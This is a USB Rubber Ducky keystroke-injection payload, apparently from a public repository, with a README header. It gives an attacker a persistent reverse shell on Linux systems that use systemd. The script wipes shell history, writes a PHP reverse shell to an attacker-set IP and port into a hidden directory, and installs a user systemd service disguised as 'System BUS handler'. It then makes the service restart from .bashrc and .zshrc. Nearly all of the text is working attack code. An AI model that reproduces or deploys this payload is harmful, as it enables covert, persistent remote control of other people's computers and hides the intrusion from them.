REM ########
REM README
REM ########
REM ## About:
REM * Title: persistentReverseDucky
REM * Description: persistentReverseDucky provides you persistent reverse shell remotely/locally..
REM * AUTHOR: drapl0n
REM * Version: 1.0
REM * Category: Remote Access
REM * Target: Unix-like operating systems with systemd.
REM * Attackmodes: HID
REM 
REM ## persistentReverseDucky: provides you persistent reverse shell remotely/locally by creating non-root systemd service within 10 secs.
REM 
REM * Note change ip address(0.0.0.0) and port number(4444) to your server's ip address and port number.
REM * Only for educational purpose.
REM ### Workflow:
REM Keeping tracks clear by disabling and deleting history. Creating hidden directory to store payload. Creating payload which checks whether internet is connected to the target system, if yes then it creates reverse shell to attackers machine. Creating non-root systemd service to keep payload running in background. Enabling service. Autostarting service on trigger of terminal emulator or shell. 
REM ### Algorithm:
REM 1. Stop storing history, this helps to keep tracks clear from begining.
REM 2. Creating reverse shell.
REM 3. Creating non-root systemd service.
REM 4. Enabling service.
REM 5. Starting service on trigger of firing terminal emulator/shell.
REM 
REM #### Support me if you like my work:
REM * https://twitter.com/drapl0n

REM ########
REM Payload
REM ########
REM Title: persistentReverseDucky
REM Description: persistentReverseDucky provides you persistent reverse shell remotely/locally by creating non-root systemd service.
REM AUTHOR: drapl0n
REM Version: 1.0
REM Category: Remote Access
REM Target: Unix-like operating systems with systemd
REM Attackmodes: HID

REM [keeping tracks clear]
DELAY 500
CTRL-ALT t
DELAY 400
STRING unset HISTFILE && HISTSIZE=0 && rm -f $HISTFILE && unset HISTFILE
ENTER
DELAY 100

REM [creating reverse shell]
STRING mkdir /var/tmp/.system
ENTER
DELAY 100
STRING echo -e "while :\ndo\n\tping -c 5 0.0.0.0\n\tif [ $? -eq 0 ]; then\n\t\tphp -r '\$sock=fsockopen(\"0.0.0.0\",4444);exec("\"/bin/sh -i "<&3 >&3 2>&3"\"");'\n\tfi\ndone" >  /var/tmp/.system/systemBus
ENTER
DELAY 100
STRING chmod +x /var/tmp/.system/systemBus
ENTER
DELAY 100

REM [creating non-root systemd service]
STRING mkdir -p ~/.config/systemd/user
ENTER
DELAY 100
STRING echo -e "[Unit]\nDescription= System BUS handler\n\n[Service]\nExecStart=/bin/bash /var/tmp/.system/systemBus -no-browser\nRestart=on-failure\nSuccessExitStatus=3 4\nRestartForceExitStatus=3 4\n\n[Install]\nWantedBy=default.target" > ~/.config/systemd/user/systemBUS.service
ENTER
DELAY 100

REM [enabling service]
STRING systemctl --user daemon-reload
ENTER
STRING systemctl --user enable --now systemBUS.service
ENTER
STRING systemctl --user start --now systemBUS.service
ENTER
DELAY 100

REM [autostarting service on terminal/shell launch]
STRING echo -e "ls -a | grep 'zshrc' &> /dev/null\nif [ $? = 0 ]; then\n\techo systemctl --user enable --now systemBUS.service >> ~/.zshrc\nfi\n\nls -a | grep 'bashrc' &> /dev/null\nif [ $? = 0 ]; then\n\techo systemctl --user enable --now systemBUS.service >> ~/.bashrc\nfi\n\n" > ~/tmmmp
ENTER
DELAY 50
STRING chmod +x ~/tmmmp && cd ~/ && ./tmmmp && rm tmmmp && exit
ENTER
